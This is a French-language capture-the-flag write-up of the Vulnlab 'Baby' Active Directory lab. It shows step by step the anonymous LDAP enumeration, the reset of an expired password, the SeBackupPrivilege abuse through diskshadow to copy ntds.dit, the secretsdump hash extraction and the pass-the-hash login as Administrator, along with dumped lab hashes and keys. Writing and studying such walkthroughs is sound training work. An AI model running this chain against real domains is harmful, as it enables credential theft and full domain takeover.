@@ -1,0 +1,343 @@
+---
+title: Baby - Easy
+description: WU baby - Easy
+categories: [Writeup]
+tags: [writeup]
+template: doc
+---
+Date : 2024-09-10 11:04
+
+## 🔭 Périmètre
+```
+IP: 10.10.124.47
+OS: Windows
+Domaine: baby.vl
+```
+## 🔍 Récupération d'informations 
+
+### PortScan
+
+
+```shell wrap
+PORT      STATE SERVICE    VERSION
+53/tcp    open  domain     Simple DNS Plus
+135/tcp   open  tcpwrapped
+139/tcp   open  tcpwrapped     
+389/tcp   open  tcpwrapped
+445/tcp   open  tcpwrapped
+593/tcp   open  tcpwrapped
+3268/tcp  open  tcpwrapped
+3389/tcp  open  tcpwrapped
+| ssl-cert: Subject: commonName=BabyDC.baby.vl
+| Issuer: commonName=BabyDC.baby.vl
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-06-16T16:00:59
+| Not valid after:  2023-12-16T16:00:59
+| MD5:   55aa85b5f2fd316af5fbb1c8ad357d53
+|_SHA-1: ae0ab02e5de2d54a9180931ff745d5a00deb41a2
+|_ssl-date: 2023-06-17T16:09:48+00:00; +24s from scanner time.
+5985/tcp  open  tcpwrapped
+49664/tcp open  tcpwrapped
+60083/tcp open  tcpwrapped
+65331/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+### Reconnaissance
+
+En voyant le `port 389` d'ouvert je décide d'utiliser `ldapsearch` pour voir si je peux récupérer les informations de l'annuaire LDAP.
+
+```shell wrap
+ldapsearch -x -b "dc=baby,dc=vl" "user"  -H ldap://10.10.124.47 | grep dn
+
+dn: DC=baby,DC=vl
+dn: CN=Administrator,CN=Users,DC=baby,DC=vl
+dn: CN=Guest,CN=Users,DC=baby,DC=vl
+dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
+dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
+dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
+dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
+dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
+dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
+dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
+dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
+dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
+dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
+dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
+dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
+dn: CN=dev,CN=Users,DC=baby,DC=vl
+dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
+dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
+dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
+dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
+dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
+dn: CN=it,CN=Users,DC=baby,DC=vl
+dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
+dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
+dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
+dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
+dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
+```
+Nous avons bien la liste des utilisateurs, ajustons la commande précédente:
+
+```shell wrap
+ldapsearch -x -b "dc=baby,dc=vl" "*"  -H ldap://10.10.124.47 | grep desc -A2
+
+--
+description: Set initial password to B<retracted>!
+givenName: Teresa
+distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
+```
+Dans ce qui ressort du résultat de la commande, nous pouvons voir le mot de passe de première connexion par défaut.
+J'essai sur Teresa.Bell :
+```shell wrap
+crackmapexec smb 10.10.124.47 -u Teresa.Bell -p 'B<retracted>!' --no-bruteforce
+SMB         10.10.124.47    445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
+SMB         10.10.124.47    445    BABYDC           [-] baby.vl\Teresa.Bell:B<retracted>! STATUS_LOGON_FAILURE
+```
+La session teresa.bell a changé de mot de passe. Il faut trouver quel utilisateur n'a pas encore servi.
+En retournant sur le `ldap` on peut voir que Caroline.Robinson n'a aucun attribut `sAMAccountName`.
+
+Testons via `smbpasswd`:
+```shell wrap
+smbpasswd -U caroline.robinson -r 10.10.124.47
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user Caroline.Robinson on 10.10.124.47.
+```
+
+Maintenant que son mot de passe est changé, voyons si nous pouvons accéder à sa session avec `Evil-WinRM`
+
+```shell wrap
+
+evil-winrm -u 'caroline.robinson' -p 'Password1234!' -i 10.10.124.47
+                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== ==============================================
+baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> type C:\Users\Caroline.Robinson\Desktop\user.txt 
+VL{<retracted>}
+```
+
+`whoami /all` nous permet de voir que l'utilisateur Caroline.Robinson dispose du privilège `SeBackupPrivilege`.
+
+Pour escalader les privilèges, j'ai suivi cet [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/).
+En créant un script:
+```shell wrap
+set context persistent nowriters
+add volume c: alias hip5kull
+create
+expose %hip5kull% z:
+```
+Une fois enregistrer, j'exécute la commande `unix2dos script.dsh` pour convertir le script puis le l'upload sur la target:
+
+```shell wrap
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> upload script.dsh
+                                        
+Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
+                                        
+Info: Uploading /workspace/script.dsh to C:\Users\Caroline.Robinson\Documents\script.dsh
+                                        
+Data: 104 bytes of 104 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> ls
+
+
+    Directory: C:\Users\Caroline.Robinson\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          9/9/2024   8:14 PM             80 script.dsh
+
+
+*Evil-WinRM* PS C:\Temp> diskshadow /s "C:/Temp/script.dsh"
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  BABYDC,  9/9/2024 8:28:51 PM
+
+-> set context persistent nowriters
+-> add volume c: alias hip5kull
+-> create
+Alias hip5kull for shadow ID {c77f1302-9e76-4bab-b63f-5c7a5f3023a0} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {298c378c-d891-4e2f-a575-2c4801e4cd4d} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {298c378c-d891-4e2f-a575-2c4801e4cd4d}
+
+	* Shadow copy ID = {c77f1302-9e76-4bab-b63f-5c7a5f3023a0}		%hip5kull%
+		- Shadow copy set: {298c378c-d891-4e2f-a575-2c4801e4cd4d}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
+		- Creation time: 9/9/2024 8:28:52 PM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+		- Originating machine: BabyDC.baby.vl
+		- Service machine: BabyDC.baby.vl
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %hip5kull% z:
+-> %hip5kull% = {c77f1302-9e76-4bab-b63f-5c7a5f3023a0}
+The shadow copy was successfully exposed as z:\.
+->
+```
+
+Une fois le script correctement exécuter nous pouvons récupérer les fichiers `ntds` et `system`:
+```shell wrap
+*Evil-WinRM* PS C:\Temp> robocopy \B Z:\Windows\NTDS . ntds.dit
+*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
+*Evil-WinRM* PS C:\Temp> download ntds.dit
+*Evil-WinRM* PS C:\Temp> download system
+```
+Les fichiers `ntds.dit` et `system` nous permettent d'obtenir les hashes des utilisateurs:
+
+```shell wrap
+secretsdump -ntds ntds.dit -system system LOCAL                                            
+Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3<retracted>3d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:6d09d9f5dde724bd1050800a674a7596:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
+baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
+baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
+baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
+baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
+baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
+baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
+baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
+baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
+baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
+baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
+Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
+Administrator:des-cbc-md5:d38cb994ae806b97
+BABYDC$:aes256-cts-hmac-sha1-96:71796eb3718047312fa70f91dec6f5a244cce5515cf11bd72e2b3cc08c01e236
+BABYDC$:aes128-cts-hmac-sha1-96:06fbdfa75708a42bb06585dab6b89049
+BABYDC$:des-cbc-md5:762ce66e29f1babf
+krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
+krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
+krbtgt:des-cbc-md5:d57383f1b3130de5
+baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
+baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
+baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
+baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
+baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
+baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
+baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
+baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
+baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
+baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
+baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
+baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
+baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
+baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
+baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
+baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
+baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
+baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
+baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
+baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
+baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
+baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
+baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
+baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
+baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
+baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
+baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
+baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
+baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
+baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
+[*] Cleaning up... 
+```
+
+Le hash d'`Administrator` obtenu, il suffit de se connecter avec:
+
+```shell wrap
+[Sep 09, 2024 - 22:37:33 (CEST)] exegol-Vulnlab /workspace# evil-winrm -u 'Administrator' -H '<retracted>' -i 10.10.124.47
+                                        
+Evil-WinRM shell v3.5
+                                        
+Info: Establishing connection to remote endpoint
+
+
+
+*Evil-WinRM* PS C:\Users\Administrator> cd "C:/Users/Administrator/Desktop/"
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/21/2021   3:22 PM             36 root.txt
+```
